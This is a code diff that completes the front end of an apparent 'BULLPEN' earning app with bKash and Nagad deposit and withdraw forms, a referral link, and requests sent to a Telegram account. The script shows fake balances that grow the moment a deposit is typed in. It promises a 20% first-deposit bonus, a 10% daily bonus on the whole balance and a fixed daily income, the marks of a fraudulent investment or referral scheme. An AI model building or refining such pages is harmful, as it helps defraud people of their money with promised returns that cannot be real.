@@ -75,3 +75,143 @@
 
       <label>Select Method:</label><br>
       <select id="wdMethod">
+        <option value="bKash">bKash</option>
+        <option value="Nagad">Nagad</option>
+      </select><br>
+
+      <button onclick="makeWithdraw()">Confirm Withdraw</button>
+    </div>
+  </div>
+
+  <!-- Profile -->
+  <div class="container hidden" id="profile">
+    <div class="card">
+      <h2>Profile</h2>
+      <p>Balance: <span id="balance">0</span> Taka</p>
+      <p>Daily Income: 40 Taka</p>
+    </div>
+  </div>
+
+  <!-- Refer -->
+  <div class="container hidden" id="refer">
+    <div class="card">
+      <h2>Refer</h2>
+      <p>Your referral link:</p>
+      <input type="text" id="refLink" value="https://myapp.com/?ref=USER123" readonly style="width:90%;padding:5px;">
+      <button onclick="copyRef()">Copy Link</button>
+      <button onclick="shareRef()">Share</button>
+    </div>
+  </div>
+
+  <!-- Bottom Nav -->
+  <div class="nav">
+    <button onclick="showPage('home')">Home</button>
+    <button onclick="showPage('profile')">Profile</button>
+    <button onclick="showPage('refer')">Refer</button>
+  </div>
+
+  <script>
+    let balance = 0;
+    let hasDeposited = false;
+    let referredBonusGiven = false;
+    let lastCheckIn = null;
+
+    function showPage(id) {
+      document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
+    }
+
+    function showDeposit() { showPage('deposit'); }
+    function showWithdraw() { showPage('withdraw'); }
+
+    // ✅ Deposit system
+    function makeDeposit() {
+      let name = document.getElementById("depName").value;
+      let amount = parseInt(document.getElementById("depAmount").value);
+      let method = document.getElementById("depMethod").value;
+
+      if (name.trim() === "" || isNaN(amount) || method === "") {
+        alert("Please fill all fields!");
+        return;
+      }
+
+      balance += amount;
+      document.getElementById('balance').innerText = balance;
+
+      hasDeposited = true;
+      document.getElementById('checkInBtn').disabled = false;
+
+      // referral bonus (first deposit only)
+      if (!referredBonusGiven) {
+        balance += amount * 0.20; // 20% bonus
+        referredBonusGiven = true;
+        alert("You got 20% referral bonus!");
+      }
+
+      // Telegram redirect
+      let message = `Deposit Request:%0AName: ${name}%0AAmount: ${amount} Taka%0AMethod: ${method}`;
+      window.location.href = `https://t.me/Bullpenpofficial?text=${message}`;
+    }
+
+    // ✅ Withdraw system
+    function makeWithdraw() {
+      let name = document.getElementById("wdName").value;
+      let amount = parseInt(document.getElementById("wdAmount").value);
+      let method = document.getElementById("wdMethod").value;
+
+      if (name.trim() === "" || isNaN(amount) || method === "") {
+        alert("Please fill all fields!");
+        return;
+      }
+
+      if (amount < 200) {
+        alert("Minimum withdraw is 200 Taka!");
+        return;
+      }
+
+      if (amount > balance) {
+        alert("Not enough balance!");
+        return;
+      }
+
+      balance -= amount;
+      document.getElementById('balance').innerText = balance;
+
+      // Telegram redirect
+      let message = `Withdraw Request:%0AName: ${name}%0AAmount: ${amount} Taka%0AMethod: ${method}`;
+      window.location.href = `https://t.me/Bullpenpofficial?text=${message}`;
+    }
+
+    // ✅ Check-in system
+    function checkIn() {
+      let today = new Date().toDateString();
+      if (lastCheckIn === today) {
+        alert("You already checked in today!");
+        return;
+      }
+      let bonus = balance * 0.10;
+      balance += bonus;
+      document.getElementById('balance').innerText = balance.toFixed(2);
+      lastCheckIn = today;
+      alert("Check-in successful! You got 10% bonus.");
+    }
+
+    // ✅ Referral system
+    function copyRef() {
+      let copyText = document.getElementById("refLink");
+      copyText.select();
+      document.execCommand("copy");
+      alert("Referral link copied!");
+    }
+
+    function shareRef() {
+      let link = document.getElementById("refLink").value;
+      if (navigator.share) {
+        navigator.share({ title: "Join BULLPEN", url: link });
+      } else {
+        alert("Sharing not supported, copy the link instead.");
+      }
+    }
+  </script>
+</body>
+</html>
